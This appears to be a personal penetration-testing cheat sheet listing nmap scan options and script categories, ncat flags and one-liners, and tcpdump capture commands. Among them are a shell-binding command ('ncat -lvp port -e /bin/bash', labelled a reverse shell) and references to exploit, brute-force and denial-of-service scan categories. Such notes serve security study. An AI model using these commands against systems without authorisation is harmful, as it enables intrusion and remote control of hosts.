//Initial nmap scan 
sudo nmap <target> -p- -sV
//port scan, packet analyzing, and os detection
sudo nmap <target> -p <port> --packet-trace -Pn -n --disable-arp-ping OR sudo nmap <target> -p <port> -O
sudo nmap <target> -p <port> -A

//Nmap scripting 
sudo nmap <target> -p <port> -sV --script vuln
sudo nmap <target> -p <port> --script banner,smtp-commands

//Scrtiping categories 
auth	Determination of authentication credentials.
broadcast	Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
brute	Executes scripts that try to log in to the respective service by brute-forcing with credentials.
default	Default scripts executed by using the -sC option.
discovery	Evaluation of accessible services.
dos	These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
exploit	This category of scripts tries to exploit known vulnerabilities for the scanned port.
external	Scripts that use external services for further processing.
fuzzer	This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
intrusive	Intrusive scripts that could negatively affect the target system.
malware	Checks if some malware infects the target system.
safe	Defensive scripts that do not perform intrusive and destructive access.
version	Extension for service detection.
vuln	Identification of specific vulnerabilities.

//Ncat and tcpdump
ncat <target> <port> OR nc -nv <target> <port>
ncat -l <port> 

//Ncat flags 
-n	No DNS resolution (faster connections)
-v	Verbose mode (shows connection details)
-vv	Extra verbose (more debugging output)
-u	Use UDP instead of TCP
-l	Listen mode (acts as a server)
-e /bin/sh	Execute shell on connection (used for reverse shells)
--keep-open	Keep the connection open after a client disconnects
--ssl	Enable SSL encryption for secure communication
--ssl-verify	Verify SSL certificates (useful for secure services) 

//Common Ncat scripts 
Connect to a server	ncat -nv target_ip port
Run a TCP server	ncat -lvp port
Run a UDP server	ncat -lvp port -u
Send a file	ncat -lvp port < file.txt
Receive a file	ncat sender_ip port > file.txt
Encrypted server	ncat --ssl -lvp port
Reverse shell	ncat -lvp port -e /bin/bash
Scan open ports	ncat -zv target_ip 1-1000

ncat --ssl -lvp <port>  --> secures communication in server
ncat --ssl <target> <port> --> uses secure server (as client) 
sudo tcpdump -i eth0 --> capturing network traffic, captures packets on ethernet interface
sudo tcpdump -i eth0 port <port> --> specific traffic on a port 
sudo tcpdump -i eth0 tcp or sudo tcpdump -i eth0 udp -->specify TCP or UDP packets 
sudo tcpdump -A -i eth0 port <port> --> viewing packet content, -A shows the packet payload
sudo tcpdump -w capture.pcap -i eth0 port <port> --> saving the captured traffic, -w capture.pcap saves the packet as a file for Wireshark analysis 
(-i wlan0 for wifi traffic)
